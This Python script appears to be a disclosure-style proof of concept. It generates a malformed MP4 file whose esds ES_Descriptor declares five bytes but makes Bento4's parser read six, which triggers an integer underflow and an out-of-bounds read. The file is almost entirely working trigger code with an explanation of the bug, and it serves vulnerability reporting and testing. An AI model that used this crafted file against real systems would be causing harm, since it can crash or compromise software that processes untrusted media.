#!/usr/bin/env python3
"""
PoC generator for AP4_EsDescriptor integer underflow (CWE-191).

Vulnerability: AP4_EsDescriptor::AP4_EsDescriptor() in Ap4EsDescriptor.cpp
- The constructor checks (m_Flags & AP4_ES_DESCRIPTOR_FLAG_URL) twice for OcrEsId,
  instead of checking AP4_ES_DESCRIPTOR_FLAG_OCR_STREAM the second time.
- With flags=0x40 (URL flag = bit 1 of m_Flags, stored as bits[6:5] of the byte),
  url_length=0, the code reads: es_id(2) + flags(1) + url_len(1) + OcrEsId(2) = 6 bytes
  but declared payload_size = 5.
- The subtraction: payload_size(5) - AP4_Size(offset-start)(6) wraps to ~4GB.
- A SubStream of ~4GB is created, causing OOB reads.

Trigger: payload_size=5, flags byte=0x40, url_length=0
"""

import struct
import os
import sys


def box(btype, data=b''):
    """Build a standard MP4 box: 4B BE size + 4B type + data."""
    if isinstance(btype, str):
        btype = btype.encode('latin1')
    return struct.pack('>I', 8 + len(data)) + btype + data


def fullbox(btype, version=0, flags=0, data=b''):
    """Build an MP4 FullBox: box header + 1B version + 3B flags + data."""
    hdr = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(btype, hdr + data)


# ---------------------------------------------------------------------------
# ftyp
# ---------------------------------------------------------------------------
def make_ftyp():
    data = b'isom'                      # major brand
    data += struct.pack('>I', 0x200)    # minor version
    data += b'isom' + b'iso2' + b'mp41'  # compatible brands
    return box('ftyp', data)


# ---------------------------------------------------------------------------
# mvhd (version 0)
# ---------------------------------------------------------------------------
def make_mvhd():
    d  = struct.pack('>I', 0)           # creation_time
    d += struct.pack('>I', 0)           # modification_time
    d += struct.pack('>I', 1000)        # timescale
    d += struct.pack('>I', 1000)        # duration
    d += struct.pack('>i', 0x00010000)  # rate   = 1.0
    d += struct.pack('>H', 0x0100)      # volume = 1.0
    d += b'\x00' * 10                   # reserved
    # 3x3 unity matrix (fixed-point)
    d += struct.pack('>9i',
                     0x00010000, 0, 0,
                     0, 0x00010000, 0,
                     0, 0, 0x40000000)
    d += b'\x00' * 24                   # pre-defined
    d += struct.pack('>I', 2)           # next_track_ID
    return fullbox('mvhd', 0, 0, d)


# ---------------------------------------------------------------------------
# tkhd (version 0, flags = enabled | in-movie)
# ---------------------------------------------------------------------------
def make_tkhd():
    d  = struct.pack('>I', 0)           # creation_time
    d += struct.pack('>I', 0)           # modification_time
    d += struct.pack('>I', 1)           # track_ID
    d += struct.pack('>I', 0)           # reserved
    d += struct.pack('>I', 1000)        # duration
    d += b'\x00' * 8                    # reserved[2]
    d += struct.pack('>H', 0)           # layer
    d += struct.pack('>H', 0)           # alternate_group
    d += struct.pack('>H', 0x0100)      # volume
    d += struct.pack('>H', 0)           # reserved
    d += struct.pack('>9i',
                     0x00010000, 0, 0,
                     0, 0x00010000, 0,
                     0, 0, 0x40000000)
    d += struct.pack('>I', 0)           # width  (fixed-point)
    d += struct.pack('>I', 0)           # height (fixed-point)
    return fullbox('tkhd', 0, 3, d)


# ---------------------------------------------------------------------------
# mdhd (version 0)
# ---------------------------------------------------------------------------
def make_mdhd():
    d  = struct.pack('>I', 0)           # creation_time
    d += struct.pack('>I', 0)           # modification_time
    d += struct.pack('>I', 44100)       # timescale
    d += struct.pack('>I', 44100)       # duration
    d += struct.pack('>H', 0x55C4)      # language = 'und'
    d += struct.pack('>H', 0)           # pre-defined
    return fullbox('mdhd', 0, 0, d)


# ---------------------------------------------------------------------------
# hdlr
# ---------------------------------------------------------------------------
def make_hdlr():
    d  = struct.pack('>I', 0)           # pre-defined
    d += b'soun'                        # handler_type
    d += b'\x00' * 12                   # reserved
    d += b'SoundHandler\x00'
    return fullbox('hdlr', 0, 0, d)


# ---------------------------------------------------------------------------
# smhd
# ---------------------------------------------------------------------------
def make_smhd():
    d  = struct.pack('>H', 0)           # balance
    d += struct.pack('>H', 0)           # reserved
    return fullbox('smhd', 0, 0, d)


# ---------------------------------------------------------------------------
# dinf / dref
# ---------------------------------------------------------------------------
def make_dinf():
    # url entry: flags=1 means self-contained (no URL string needed)
    url_entry = fullbox('url ', 0, 1)
    dref_data = struct.pack('>I', 1) + url_entry   # entry_count = 1
    dref = fullbox('dref', 0, 0, dref_data)
    return box('dinf', dref)


# ---------------------------------------------------------------------------
# esds – crafted to trigger the AP4_EsDescriptor underflow
# ---------------------------------------------------------------------------
def make_esds_vuln():
    """
    ES_Descriptor layout in the byte stream (after esds fullbox header):

      [03]          tag  = 0x03 (ES_Descriptor)
      [05]          declared payload_size = 5  (only 4 bytes written below)
      [00 01]       es_id = 1                  (+2 → consumed 2)
      [40]          flags byte:
                      m_Flags = (0x40 >> 5) & 7 = 2 = AP4_ES_DESCRIPTOR_FLAG_URL
                      (+1 → consumed 3)
      [00]          url_length = 0             (+1 → consumed 4)
                    (url_string = "", 0 bytes)
      --- BUG: code checks URL flag again instead of OCR_STREAM flag ---
      reads 2 more bytes as OcrEsId             (+2 → consumed 6)

    offset - start = 6 > payload_size = 5
    AP4_Size(5) - AP4_Size(6) wraps to 0xFFFFFFFF (~4 GB) → OOB SubStream read.
    """

    es_payload  = struct.pack('>H', 1)  # es_id = 0x0001
    es_payload += bytes([0x40])          # flags byte: URL bit set
    es_payload += bytes([0x00])          # url_length = 0
    # Only 4 bytes written; declared payload_size = 5.
    # The code will read 2 bytes for OcrEsId (URL-flag bug), consuming byte 5
    # (from the stream past our 4 payload bytes) and byte 6 – triggering underflow.

    es_desc  = bytes([0x03, 0x05])  # tag=ES_Descriptor, declared_size=5
    es_desc += es_payload            # 4 bytes of actual payload

    # esds FullBox: version(1B) + flags(3B) = 0x00000000, then the descriptor
    esds_content = struct.pack('>I', 0) + es_desc
    return box('esds', esds_content)


# ---------------------------------------------------------------------------
# mp4a sample entry (AudioSampleEntry)
# ---------------------------------------------------------------------------
def make_mp4a():
    d  = b'\x00' * 6                    # reserved
    d += struct.pack('>H', 1)           # data-reference-index
    d += b'\x00' * 8                    # reserved (audio sample entry v0)
    d += struct.pack('>H', 2)           # channelcount
    d += struct.pack('>H', 16)          # samplesize
    d += struct.pack('>H', 0)           # pre-defined (compression ID)
    d += struct.pack('>H', 0)           # packet size (reserved)
    d += struct.pack('>I', 44100 << 16) # samplerate (16.16 fixed-point)
    d += make_esds_vuln()
    return box('mp4a', d)


# ---------------------------------------------------------------------------
# stsd
# ---------------------------------------------------------------------------
def make_stsd():
    entry_count = struct.pack('>I', 1)
    return fullbox('stsd', 0, 0, entry_count + make_mp4a())


# ---------------------------------------------------------------------------
# stts – one entry: 1 sample, delta=1000
# ---------------------------------------------------------------------------
def make_stts():
    d  = struct.pack('>I', 1)    # entry_count
    d += struct.pack('>I', 1)    # sample_count
    d += struct.pack('>I', 1000) # sample_delta
    return fullbox('stts', 0, 0, d)


# ---------------------------------------------------------------------------
# stsc – 1 chunk, 1 sample per chunk
# ---------------------------------------------------------------------------
def make_stsc():
    d  = struct.pack('>I', 1)   # entry_count
    d += struct.pack('>I', 1)   # first_chunk
    d += struct.pack('>I', 1)   # samples_per_chunk
    d += struct.pack('>I', 1)   # sample_description_index
    return fullbox('stsc', 0, 0, d)


# ---------------------------------------------------------------------------
# stsz – variable-size: 1 sample of 4 bytes
# ---------------------------------------------------------------------------
def make_stsz():
    d  = struct.pack('>I', 0)   # sample_size = 0 (variable)
    d += struct.pack('>I', 1)   # sample_count
    d += struct.pack('>I', 4)   # entry_size for sample 1
    return fullbox('stsz', 0, 0, d)


# ---------------------------------------------------------------------------
# stco – 1 chunk offset (placeholder)
# ---------------------------------------------------------------------------
def make_stco():
    d  = struct.pack('>I', 1)       # entry_count
    d += struct.pack('>I', 0x1000)  # chunk_offset (placeholder)
    return fullbox('stco', 0, 0, d)


# ---------------------------------------------------------------------------
# stbl
# ---------------------------------------------------------------------------
def make_stbl():
    return box('stbl',
               make_stsd() +
               make_stts() +
               make_stsc() +
               make_stsz() +
               make_stco())


# ---------------------------------------------------------------------------
# minf
# ---------------------------------------------------------------------------
def make_minf():
    return box('minf', make_smhd() + make_dinf() + make_stbl())


# ---------------------------------------------------------------------------
# mdia
# ---------------------------------------------------------------------------
def make_mdia():
    return box('mdia', make_mdhd() + make_hdlr() + make_minf())


# ---------------------------------------------------------------------------
# trak
# ---------------------------------------------------------------------------
def make_trak():
    return box('trak', make_tkhd() + make_mdia())


# ---------------------------------------------------------------------------
# moov
# ---------------------------------------------------------------------------
def make_moov():
    return box('moov', make_mvhd() + make_trak())


# ---------------------------------------------------------------------------
# Top-level MP4
# ---------------------------------------------------------------------------
def make_mp4():
    return make_ftyp() + make_moov()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, 'vuln_002.mp4')

    mp4_data = make_mp4()

    with open(output_path, 'wb') as f:
        f.write(mp4_data)

    print(f"Generated {output_path} ({len(mp4_data)} bytes)")
    print("ES_Descriptor: tag=0x03  declared_payload_size=5  flags_byte=0x40(URL)")
    print("Code consumes 6 bytes (2+1+1+2) vs declared 5 → AP4_Size underflow → ~4GB SubStream")
